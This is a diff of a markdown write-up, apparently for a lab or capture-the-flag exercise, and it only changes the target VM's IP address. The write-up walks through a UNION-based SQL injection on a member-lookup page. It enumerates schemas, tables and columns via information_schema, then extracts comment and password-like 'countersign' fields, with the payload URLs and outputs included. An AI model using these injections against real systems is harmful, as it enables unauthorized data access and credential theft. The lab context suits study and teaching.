@@ -1,11 +1,11 @@
 # Users Page
 
-__http://192.168.99.101/?page=member&id=1&Submit=Submit__
+__http://192.168.56.101/?page=member&id=1&Submit=Submit__
 
 ## Description
 This page allow to find the members of the service.
 ## Form Outputs
-The [page](#http://192.168.99.101/?page=member&id=42%20union%20select%20database(),%20schema_name%20from%20information_schema.schemata&Submit=Submit) return the list of members
+The [page](#http://192.168.56.101/?page=member&id=42%20union%20select%20database(),%20schema_name%20from%20information_schema.schemata&Submit=Submit) return the list of members
 
 ```
 ID: 42 union select database(), schema_name from information_schema.schemata 
@@ -25,7 +25,7 @@ First name: Member_Sql_Injection
 Surname : Member_survey
 ```
 
-The [page](#http://192.168.99.101/?page=member&id=42%20union%20select%20table_name,%20create_time%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit) return the list of the tables
+The [page](#http://192.168.56.101/?page=member&id=42%20union%20select%20table_name,%20create_time%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit) return the list of the tables
 
 ```
 ID: 42 union select table_name, create_time from information_schema.tables where table_schema=database() 
@@ -33,7 +33,7 @@ First name: users
 Surname : 2021-06-29 20:14:31
 ```
 
-Let's check the column names [here](#http://192.168.99.101/?page=member&id=42%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)
+Let's check the column names [here](#http://192.168.56.101/?page=member&id=42%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)
 
 ```
 ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
@@ -64,7 +64,7 @@ Surname : varchar(255)
 We've got the following columns ```user_id first_name last_name town country planet Commentaire countersign```
 
 Then we get the personal data </br>
-[select Commentaire, countersign from users](#http://192.168.99.101/?page=member&id=42%20union%20select%20Commentaire,%20countersign%20from%20users&Submit=Submit)
+[select Commentaire, countersign from users](#http://192.168.56.101/?page=member&id=42%20union%20select%20Commentaire,%20countersign%20from%20users&Submit=Submit)
 ```
 ID: 42 union select Commentaire, countersign from users 
 First name: Je pense, donc je suis
